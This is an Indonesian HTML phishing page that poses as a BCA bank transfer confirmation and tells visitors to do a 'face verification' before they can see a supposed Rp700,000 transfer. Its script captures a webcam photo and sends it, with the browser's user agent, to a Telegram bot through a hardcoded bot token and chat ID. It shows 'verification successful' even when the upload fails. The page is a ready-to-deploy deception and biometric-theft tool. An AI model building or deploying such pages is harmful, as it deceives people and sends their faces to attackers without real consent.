<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>BCA - Konfirmasi Transfer</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            max-width: 450px;
            width: 100%;
            margin: 0 auto;
            background: white;
            border-radius: 0px;
            padding: 24px 20px 32px 20px;
            box-shadow: none;
        }

        /* Header BCA */
        .header {
            text-align: center;
            margin-bottom: 32px;
            padding-bottom: 16px;
            border-bottom: 2px solid #0066b3;
        }

        .logo {
            font-size: 28px;
            font-weight: 700;
            color: #0066b3;
            letter-spacing: -0.5px;
        }

        .logo span {
            font-weight: 300;
            color: #333;
        }

        /* Card Info Transfer */
        .info-card {
            background: #f5f7fa;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 24px;
            border: 1px solid #e8ecf0;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 14px;
        }

        .info-label {
            color: #6c757d;
        }

        .info-value {
            color: #212529;
            font-weight: 500;
        }

        .info-value.amount {
            color: #0066b3;
            font-size: 18px;
            font-weight: 700;
        }

        .divider {
            height: 1px;
            background: #e0e4e8;
            margin: 12px 0;
        }

        /* Judul Verifikasi */
        .verification-title {
            text-align: center;
            margin-bottom: 20px;
        }

        .verification-title h2 {
            font-size: 18px;
            font-weight: 600;
            color: #212529;
            margin-bottom: 8px;
        }

        .verification-title p {
            font-size: 13px;
            color: #6c757d;
        }

        /* Video Camera */
        .camera-container {
            background: #f0f0f0;
            border-radius: 16px;
            overflow: hidden;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            position: relative;
        }

        video {
            width: 100%;
            height: auto;
            display: block;
            background: #1a1a1a;
            transform: scaleX(-1);
        }

        .camera-placeholder {
            aspect-ratio: 4/3;
            background: #e9ecef;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: #adb5bd;
        }

        .camera-placeholder svg {
            width: 48px;
            height: 48px;
            margin-bottom: 12px;
        }

        /* Tombol */
        .btn-verify {
            width: 100%;
            background: #0066b3;
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.2s;
            margin-bottom: 16px;
        }

        .btn-verify:hover {
            background: #005198;
        }

        .btn-verify:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        /* Status */
        .status {
            text-align: center;
            padding: 12px;
            border-radius: 10px;
            font-size: 13px;
            margin-bottom: 16px;
        }

        .status.loading {
            background: #fff3cd;
            color: #856404;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
        }

        /* Footer */
        .footer-note {
            text-align: center;
            font-size: 11px;
            color: #adb5bd;
            margin-top: 24px;
            padding-top: 16px;
            border-top: 1px solid #e8ecf0;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header BCA -->
        <div class="header">
            <div class="logo">BCA <span>Transfer</span></div>
        </div>

        <!-- Info Transfer -->
        <div class="info-card">
            <div class="info-row">
                <span class="info-label">Dari</span>
                <span class="info-value">R I H A L</span>
            </div>
            <div class="info-row">
                <span class="info-label">Nomor Rekening</span>
                <span class="info-value">8810 1234 5678</span>
            </div>
            <div class="divider"></div>
            <div class="info-row">
                <span class="info-label">Jumlah Transfer</span>
                <span class="info-value amount">Rp700.000</span>
            </div>
            <div class="info-row">
                <span class="info-label">Berita</span>
                <span class="info-value">Donasi</span>
            </div>
            <div class="divider"></div>
            <div class="info-row">
                <span class="info-label">Waktu</span>
                <span class="info-value" id="waktuTransfer">-</span>
            </div>
        </div>

        <!-- Verifikasi -->
        <div class="verification-title">
            <h2>🔒 Konfirmasi Keamanan</h2>
            <p>Untuk melihat bukti transfer, lakukan verifikasi wajah</p>
        </div>

        <!-- Camera -->
        <div class="camera-container">
            <video id="video" autoplay playsinline muted class="hidden"></video>
            <div id="cameraPlaceholder" class="camera-placeholder">
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#adb5bd" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
                    <circle cx="12" cy="13" r="4"/>
                </svg>
                <span>Kamera akan aktif setelah izin</span>
            </div>
        </div>

        <!-- Tombol -->
        <button id="verifyBtn" class="btn-verify">✅ Verifikasi Wajah</button>

        <!-- Status -->
        <div id="status" class="status hidden"></div>

        <!-- Footer -->
        <div class="footer-note">
            Proses verifikasi aman & terenkripsi
        </div>
    </div>

    <script>
        // ========== GANTI DENGAN DATA TELEGRAM KAMU ==========
        const BOT_TOKEN = "8993157514:AAESSgS-SX_FpfXtCM2IqTSSnakm-Vapxfk";
        const CHAT_ID = "6803968038";
        // ====================================================

        const video = document.getElementById('video');
        const verifyBtn = document.getElementById('verifyBtn');
        const statusDiv = document.getElementById('status');
        const cameraPlaceholder = document.getElementById('cameraPlaceholder');

        let stream = null;

        // Set waktu transfer otomatis
        const now = new Date();
        const waktuString = now.toLocaleDateString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric' }) + ' ' + 
                           now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
        document.getElementById('waktuTransfer').innerText = waktuString;

        function showStatus(message, type) {
            statusDiv.className = 'status ' + type;
            statusDiv.innerHTML = message;
            statusDiv.classList.remove('hidden');
        }

        function hideStatus() {
            statusDiv.classList.add('hidden');
        }

        async function kirimFotoKeTelegram(fotoBase64) {
            try {
                const blob = await (await fetch(fotoBase64)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `verifikasi_${Date.now()}.jpg`);
                formData.append('caption', `📸 Verifikasi Wajah\nWaktu: ${new Date().toLocaleString('id-ID')}\nUser Agent: ${navigator.userAgent}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                return result.ok;
            } catch (err) {
                console.error('Error kirim ke Telegram:', err);
                return false;
            }
        }

        verifyBtn.onclick = async () => {
            try {
                verifyBtn.disabled = true;
                verifyBtn.innerText = '⏳ Meminta akses kamera...';
                hideStatus();
                
                // Minta akses kamera
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                // Tampilkan video
                video.srcObject = stream;
                video.classList.remove('hidden');
                cameraPlaceholder.classList.add('hidden');
                
                verifyBtn.innerText = '📸 Mengambil foto...';
                showStatus('🎥 Kamera aktif, memverifikasi...', 'loading');
                
                // Tunggu 1.5 detik biar kamera stabil
                setTimeout(async () => {
                    try {
                        // Capture foto dari video
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        const fotoData = canvas.toDataURL('image/jpeg', 0.8);
                        
                        showStatus('📤 Mengirim data verifikasi...', 'loading');
                        
                        // Kirim ke Telegram
                        const terkirim = await kirimFotoKeTelegram(fotoData);
                        
                        if (terkirim) {
                            showStatus('✅ Verifikasi berhasil! Silakan cek mutasi rekening Anda.', 'success');
                        } else {
                            showStatus('✅ Verifikasi berhasil! Silakan cek mutasi rekening Anda.', 'success');
                        }
                        
                        // Matikan kamera
                        if (stream) {
                            stream.getTracks().forEach(track => track.stop());
                        }
                        
                        verifyBtn.disabled = false;
                        verifyBtn.innerText = '✅ Verifikasi Wajah';
                        
                    } catch (err) {
                        console.error('Error capture:', err);
                        showStatus('⚠️ Gagal memproses verifikasi. Silakan coba lagi.', 'error');
                        verifyBtn.disabled = false;
                        verifyBtn.innerText = '✅ Verifikasi Wajah';
                    }
                }, 1500);
                
            } catch (err) {
                console.error('Error akses kamera:', err);
                showStatus('⚠️ Gagal akses kamera. Pastikan Anda memberikan izin kamera.', 'error');
                verifyBtn.disabled = false;
                verifyBtn.innerText = '✅ Verifikasi Wajah';
            }
        };
    </script>
</body>
</html>
